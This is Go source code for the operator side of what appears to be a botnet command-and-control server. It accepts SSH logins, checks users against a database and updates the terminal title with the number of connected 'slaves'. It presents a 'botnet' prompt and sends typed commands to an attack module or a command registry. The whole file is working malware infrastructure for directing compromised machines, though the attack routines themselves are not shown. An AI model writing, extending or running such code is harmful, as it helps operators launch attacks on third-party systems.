package master

import (
	"fmt"
	"server/core/config"
	"server/core/master/attack"
	"server/core/master/command"
	"server/core/master/database"
	"server/core/master/session/sessions"
	"server/core/master/session/sshSession"
	"server/core/slaves/slave"
	"strings"
	"time"

	"github.com/mattn/go-shellwords"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

type Master struct {
	*sshSession.SecureShellSession
	Channel ssh.Channel
	session *sessions.Session
}

func Handle(master *Master) {
	defer master.Close()

	user, err := database.Connection.UserFromName(master.ServerConn.User())
	if err != nil {
		config.Logger.Error("An error occurred while getting the user", "name", master.ServerConn.User(), "error", err)
		return
	}

	master.session = sessions.New(&sessions.Session{
		SecureShellSession: master.SecureShellSession,
		User:               user,
		Created:            time.Now(),
	})

	go func() {
		for {
			err := master.session.Print(fmt.Sprintf("\033]0;%d connected | %s\007", slave.List.Count(), master.session.Name))
			if err != nil {
				master.Close()
				break
			}

			time.Sleep(1 * time.Second)
		}
	}()

	master.session.Clear()

	term := terminal.NewTerminal(master.Channel, "\x1b[94m"+user.Name+"\x1b[0m/\x1b[94mbotnet\x1b[0m: \x1b[0m")

	for {
		line, err := term.ReadLine()
		if err != nil {
			return
		}

		if strings.Trim(line, " ") == "" {
			continue
		}

		args, err := shellwords.Parse(line)
		if err != nil {
			continue
		}

		atk := attack.Get(args[0])
		if atk != nil {
			attack.Handle(args, master.session, atk)
			continue
		}

		cmd := command.Get(args[0])
		if cmd == nil {
			master.session.Println("\x1b[91mCommand could not be executed because it does not exist")
			continue
		}

		cmd.Executor(args[1:], master.session)
	}
}

func (master *Master) Close() {
	master.Channel.Close()
	if master.session != nil {
		master.session.Remove()
	}
}
